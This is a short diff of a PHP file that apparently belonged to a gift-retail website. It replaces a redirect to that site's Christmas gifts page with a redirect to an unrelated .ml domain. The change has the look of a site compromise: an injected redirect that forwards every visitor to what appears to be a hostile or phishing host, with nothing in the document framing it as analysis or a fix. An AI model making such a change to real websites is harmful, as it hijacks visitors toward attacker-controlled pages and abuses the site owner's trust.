@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.gettingpersonal.co.uk/christmas-gifts");
+header("Location: https://codeactivaten.ml/actnor/");
 die();
 ?>
